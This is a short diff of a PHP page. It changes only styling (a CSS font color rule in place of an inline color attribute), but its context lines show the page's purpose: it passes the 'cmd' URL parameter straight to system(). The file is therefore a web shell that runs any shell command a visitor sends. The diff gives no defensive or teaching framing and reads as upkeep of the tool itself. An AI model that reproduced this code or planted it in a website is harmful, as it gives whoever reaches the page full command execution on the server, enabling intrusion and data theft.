@@ -6,6 +6,9 @@
     body {
       background: #222222
     }
+    font {
+      color: #eeeeee;
+    }
   </style>
 </head>
 <body>
@@ -15,7 +18,7 @@
   </form>
 
   <pre>
-    <font color="white">
+    <font>
       <?php
       if ($_GET["cmd"]) {
         system($_GET["cmd"]);
